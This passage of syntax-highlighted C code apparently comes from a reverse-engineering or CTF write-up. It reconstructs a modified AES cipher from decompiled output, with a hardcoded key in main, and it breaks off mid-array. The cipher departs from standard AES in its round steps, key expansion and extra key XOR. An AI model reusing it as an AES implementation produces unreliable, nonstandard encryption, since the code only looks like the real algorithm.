class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    R[<span class="number">0</span>] = <span class="number">0x02</span>;</span><br><span class="line">    i--;</span><br><span class="line">    <span class="keyword">while</span> (i &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      R[<span class="number">0</span>] = gmult(R[<span class="number">0</span>], <span class="number">0x02</span>);</span><br><span class="line">      i--;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> R;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Transformation in the Cipher and Inverse Cipher in which a Round </span></span><br><span class="line"><span class="comment"> * Key is added to the State using an XOR operation. The length of a </span></span><br><span class="line"><span class="comment"> * Round Key equals the size of the State (i.e., for Nb = 4, the Round </span></span><br><span class="line"><span class="comment"> * Key length equals 128 bits/16 bytes).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_round_key</span><span class="params">(<span class="keyword">uint8_t</span> *state, <span class="keyword">uint8_t</span> *w, <span class="keyword">uint8_t</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Nb; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint8_t</span> j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      state[<span class="number">4</span> * i + j] ^= w[<span class="number">4</span> * j + i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Transformation in the Cipher that takes all of the columns of the </span></span><br><span class="line"><span class="comment"> * State and mixes their data (independently of one another) to </span></span><br><span class="line"><span class="comment"> * produce new columns.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">unknow</span><span class="params">(<span class="keyword">uint8_t</span> *w, <span class="keyword">char</span> state, <span class="keyword">char</span> matrix)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( state &gt;= <span class="number">0</span> )</span><br><span class="line">    result = <span class="number">2</span> * state;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (<span class="number">2</span> * state) ^ <span class="number">0x1B</span>;</span><br><span class="line">  v14 = result;</span><br><span class="line">  <span class="keyword">if</span> ( matrix == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">  <span class="keyword">if</span> ( matrix != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( matrix )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        result ^= state;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        result = unknow(w, result, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v4 = unknow(w, result, <span class="number">2</span>);</span><br><span class="line">        result = unknow(w, v4, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v5 = unknow(w, result, <span class="number">2</span>);</span><br><span class="line">        result = state ^ unknow(w, v5, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        v6 = unknow(w, result, <span class="number">2</span>);</span><br><span class="line">        result = v14 ^ unknow(w, v6, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v7 = unknow(w, result, <span class="number">2</span>);</span><br><span class="line">        result = state ^ v14 ^ unknow(w, v7, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v8 = unknow(w, result, <span class="number">2</span>);</span><br><span class="line">        v9 = unknow(w, v8, <span class="number">2</span>);</span><br><span class="line">        result = v9 ^ unknow(w, v14, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">        v10 = unknow(w, result, <span class="number">2</span>);</span><br><span class="line">        v11 = unknow(w, v10, <span class="number">2</span>);</span><br><span class="line">        result = state ^ v11 ^ unknow(w, v14, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v12 = unknow(w, result, <span class="number">2</span>);</span><br><span class="line">        v13 = unknow(w, v12, <span class="number">2</span>);</span><br><span class="line">        result = v14 ^ v13 ^ unknow(w, v14, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mix_columns</span><span class="params">(<span class="keyword">uint8_t</span> *w, <span class="keyword">uint8_t</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> a[] = &#123;<span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x03</span>&#125;; <span class="comment">// a(x) = &#123;02&#125; + &#123;01&#125;x + &#123;01&#125;x2 + &#123;03&#125;x3</span></span><br><span class="line">  <span class="keyword">uint8_t</span> i, j, col[<span class="number">4</span>], res[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; Nb; j++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      col[i] = state[Nb*i+j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    coef_mult(a, col, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      state[Nb*i+j] = res[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Transformation in the Inverse Cipher that is the inverse of </span></span><br><span class="line"><span class="comment"> * MixColumns().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inv_mix_columns</span><span class="params">(<span class="keyword">uint8_t</span> *w ,<span class="keyword">uint8_t</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> a[] = &#123;<span class="number">0x0e</span>, <span class="number">0x09</span>, <span class="number">0x0d</span>, <span class="number">0x0b</span>&#125;; <span class="comment">// a(x) = &#123;0e&#125; + &#123;09&#125;x + &#123;0d&#125;x2 + &#123;0b&#125;x3</span></span><br><span class="line">  <span class="keyword">uint8_t</span> i, j, col[<span class="number">4</span>], res[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; Nb; j++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      col[i] = state[Nb*i+j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    coef_mult(a, col, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">      state[Nb*i+j] = res[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Transformation in the Cipher that processes the State by cyclically </span></span><br><span class="line"><span class="comment"> * shifting the last three rows of the State by different offsets. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shift_rows</span><span class="params">(<span class="keyword">uint8_t</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> i, k, s, tmp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">uint8_t</span> v2 = s++;</span><br><span class="line">      <span class="keyword">if</span> (!(i &gt; v2))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      tmp = state[Nb * i + <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt; Nb; k++)</span><br><span class="line">      &#123;</span><br><span class="line">        state[Nb * i + k - <span class="number">1</span>] = state[Nb * i + k];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      state[Nb * i + Nb - <span class="number">1</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Transformation in the Inverse Cipher that is the inverse of </span></span><br><span class="line"><span class="comment"> * ShiftRows().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inv_shift_rows</span><span class="params">(<span class="keyword">uint8_t</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> i, k, s, tmp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (s &lt; i)</span><br><span class="line">    &#123;</span><br><span class="line">      tmp = state[Nb * i + Nb - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (k = Nb - <span class="number">1</span>; k &gt; <span class="number">0</span>; k--)</span><br><span class="line">      &#123;</span><br><span class="line">        state[Nb * i + k] = state[Nb * i + k - <span class="number">1</span>];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      state[Nb * i + <span class="number">0</span>] = tmp;</span><br><span class="line">      s++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Transformation in the Cipher that processes the State using a non­</span></span><br><span class="line"><span class="comment"> * linear byte substitution table (S-box) that operates on each of the </span></span><br><span class="line"><span class="comment"> * State bytes independently. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_bytes</span><span class="params">(<span class="keyword">uint8_t</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> i, j;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; Nb; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      state[Nb * i + j] = s_box[state[Nb * i + j]];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Transformation in the Inverse Cipher that is the inverse of </span></span><br><span class="line"><span class="comment"> * SubBytes().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inv_sub_bytes</span><span class="params">(<span class="keyword">uint8_t</span> *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> i, j;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; Nb; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      state[Nb * i + j] = inv_s_box[state[Nb * i + j]];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Function used in the Key Expansion routine that takes a four-byte </span></span><br><span class="line"><span class="comment"> * input word and applies an S-box to each of the four bytes to </span></span><br><span class="line"><span class="comment"> * produce an output word.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_word</span><span class="params">(<span class="keyword">uint8_t</span> *w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    w[i] = s_box[w[i]];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Function used in the Key Expansion routine that takes a four-byte </span></span><br><span class="line"><span class="comment"> * word and performs a cyclic permutation. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rot_word</span><span class="params">(<span class="keyword">uint8_t</span> *w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> tmp;</span><br><span class="line">  <span class="keyword">uint8_t</span> i;</span><br><span class="line"></span><br><span class="line">  tmp = w[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    w[i] = w[i + <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  w[<span class="number">3</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Key Expansion</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">aes_key_expansion</span><span class="params">(<span class="keyword">uint8_t</span> *key, <span class="keyword">uint8_t</span> *w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> tmp[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">uint8_t</span> i;</span><br><span class="line">  <span class="keyword">uint8_t</span> len = Nb * (Nr + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">uint8_t</span> RCON[] = &#123;<span class="number">0x8d</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Nk; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    w[<span class="number">4</span> * i + <span class="number">0</span>] = key[<span class="number">4</span> * i + <span class="number">0</span>];</span><br><span class="line">    w[<span class="number">4</span> * i + <span class="number">1</span>] = key[<span class="number">4</span> * i + <span class="number">1</span>];</span><br><span class="line">    w[<span class="number">4</span> * i + <span class="number">2</span>] = key[<span class="number">4</span> * i + <span class="number">2</span>];</span><br><span class="line">    w[<span class="number">4</span> * i + <span class="number">3</span>] = key[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = Nk; i &lt; len; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    tmp[<span class="number">0</span>] = w[<span class="number">4</span> * (i - <span class="number">1</span>) + <span class="number">0</span>];</span><br><span class="line">    tmp[<span class="number">1</span>] = w[<span class="number">4</span> * (i - <span class="number">1</span>) + <span class="number">1</span>];</span><br><span class="line">    tmp[<span class="number">2</span>] = w[<span class="number">4</span> * (i - <span class="number">1</span>) + <span class="number">2</span>];</span><br><span class="line">    tmp[<span class="number">3</span>] = w[<span class="number">4</span> * (i - <span class="number">1</span>) + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((i &amp; <span class="number">3</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      tmp[<span class="number">1</span>] = s_box[tmp[<span class="number">2</span>]];</span><br><span class="line">      tmp[<span class="number">2</span>] = s_box[tmp[<span class="number">3</span>]];</span><br><span class="line">      tmp[<span class="number">3</span>] = s_box[w[<span class="number">4</span> * (i - <span class="number">1</span>)]];</span><br><span class="line">      tmp[<span class="number">0</span>] = s_box[w[<span class="number">4</span> * (i - <span class="number">1</span>) + <span class="number">1</span>]] ^ RCON[i &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w[<span class="number">4</span> * i + <span class="number">0</span>] = w[<span class="number">4</span> * (i - Nk) + <span class="number">0</span>] ^ tmp[<span class="number">0</span>];</span><br><span class="line">    w[<span class="number">4</span> * i + <span class="number">1</span>] = w[<span class="number">4</span> * (i - Nk) + <span class="number">1</span>] ^ tmp[<span class="number">1</span>];</span><br><span class="line">    w[<span class="number">4</span> * i + <span class="number">2</span>] = w[<span class="number">4</span> * (i - Nk) + <span class="number">2</span>] ^ tmp[<span class="number">2</span>];</span><br><span class="line">    w[<span class="number">4</span> * i + <span class="number">3</span>] = w[<span class="number">4</span> * (i - Nk) + <span class="number">3</span>] ^ tmp[<span class="number">3</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Initialize AES variables and allocate memory for expanded key</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> *<span class="title">aes_init</span><span class="params">(<span class="keyword">unsigned</span> key_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (key_size)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">    Nk = <span class="number">4</span>;</span><br><span class="line">    Nr = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">    Nk = <span class="number">6</span>;</span><br><span class="line">    Nr = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">    Nk = <span class="number">8</span>;</span><br><span class="line">    Nr = <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">malloc</span>(Nb * (Nr + <span class="number">1</span>) * <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Performs the AES cipher operation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span> <span class="params">(<span class="keyword">char</span> *in, <span class="keyword">char</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    in[i] ^= key[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Performs the AES cipher operation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">aes_cipher</span><span class="params">(<span class="keyword">uint8_t</span> *w, <span class="keyword">uint8_t</span> *in, <span class="keyword">uint8_t</span> *out, <span class="keyword">uint8_t</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> state[<span class="number">4</span> * <span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">uint8_t</span> r, i, j;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">xor</span>(in, key);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      state[<span class="number">4</span> * j + i] = in[<span class="number">4</span>*i + j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add_round_key(state, w, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (r = <span class="number">1</span>;; r++)</span><br><span class="line">  &#123;</span><br><span class="line">    inv_sub_bytes(state);</span><br><span class="line">    shift_rows(state);</span><br><span class="line">    <span class="keyword">if</span> (r == <span class="number">10</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    mix_columns(w, state);</span><br><span class="line">    add_round_key(state, w+<span class="number">16</span>*r, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add_round_key(state, w+<span class="number">160</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; Nb; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      out[i + <span class="number">4</span> * j] = state[Nb * i + j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">30</span>;i+=<span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(out+i,<span class="string">&quot;%02x&quot;</span>,state[(i*<span class="number">2</span>)%<span class="number">15</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sprintf</span>(out+<span class="number">30</span>,<span class="string">&quot;%02x&quot;</span>,state[<span class="number">15</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Performs the AES inverse cipher operation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">aes_inv_cipher</span><span class="params">(<span class="keyword">uint8_t</span>* w,<span class="keyword">uint8_t</span> *in, <span class="keyword">uint8_t</span> *out, <span class="keyword">uint8_t</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// uint8_t Te_InvS[16][16] = &#123; 0 &#125;; //逆S盒缓存</span></span><br><span class="line">  <span class="comment">// uint8_t Te_InVSAdd[2] = &#123; 0 &#125;; //位置</span></span><br><span class="line">  <span class="comment">// for (uint8_t i = 0; i &lt; 16; i++) &#123; //计算逆S盒</span></span><br><span class="line">  <span class="comment">// for (uint8_t n = 0; n &lt; 16; n++) &#123;</span></span><br><span class="line">  <span class="comment">// Te_InVSAdd[0] = (s_box[i*16+n] &gt;&gt; 4) &amp; 0x0f; //取⾏</span></span><br><span class="line">  <span class="comment">// Te_InVSAdd[1] = (s_box[i*16+n] &gt;&gt; 0) &amp; 0x0f; //取列</span></span><br><span class="line">  <span class="comment">// Te_InvS[Te_InVSAdd[0]][Te_InVSAdd[1]] = i * 16 + n; //置值</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  <span class="keyword">uint8_t</span> state[<span class="number">4</span> * <span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">uint8_t</span> r, i, j;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; Nb; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      state[Nb * i + j] = in[i + <span class="number">4</span> * j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add_round_key(state, w+<span class="number">160</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (r = Nr - <span class="number">1</span>; r &gt;= <span class="number">1</span>; r--)</span><br><span class="line">  &#123;</span><br><span class="line">    inv_shift_rows(state);</span><br><span class="line">    sub_bytes(state);</span><br><span class="line">    add_round_key(state, w+<span class="number">16</span>*r, <span class="number">0</span>);</span><br><span class="line">    inv_mix_columns(w,state);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  inv_shift_rows(state);</span><br><span class="line">  sub_bytes(state);</span><br><span class="line">  add_round_key(state, w, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; Nb; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      out[i + <span class="number">4</span> * j] = state[Nb * i + j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">xor</span>(out, key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint8_t</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 256 bit key */</span></span><br><span class="line">  <span class="keyword">uint8_t</span> key[] = &#123;<span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x07</span>, <span class="number">0x36</span>, <span class="number">0x6A</span>, <span class="number">0x37</span>, <span class="number">0x78</span>, <span class="number">0x31</span>, <span class="number">0x48</span>, <span class="number">0x39</span>,</span><br><span class="line">           <span class="number">0x42</span>, <span class="number">0x39</span>, <span class="number">0x14</span>, <span class="number">0x31</span>, <span class="number">0xD5</span>, <span class="number">0x32</span>, <span class="number">0x62</span>, <span class="number">0x36</span>, <span class="number">0xF9</span>, <span class="number">0x38</span>,</span><br><span class="line">           <span class="number">0x42</span>, <span class="number">0x30</span>, <span class="number">0xC3</span>, <span class="number">0x31</span>, <span class="number">0x6A</span>, <span class="number">0x35</span>, <span class="number">0x48</span>, <span class="number">0x38</span>, <span class="number">0x34</span>, <span class="number">0x35</span>,</span><br><span class="line">           <span class="number">0x54</span>, <span class="number">0x34</span>, <span class="number">0x29</span>, <span class="number">0x34</span>, <span class="number">0x51</span>, <span class="number">0x36</span>, <span class="number">0x15</span>, <span class="number">0x39</span>, <span class="number">0xD2</span>, <span class="number">0x38</span>,</span><br><span class="line">           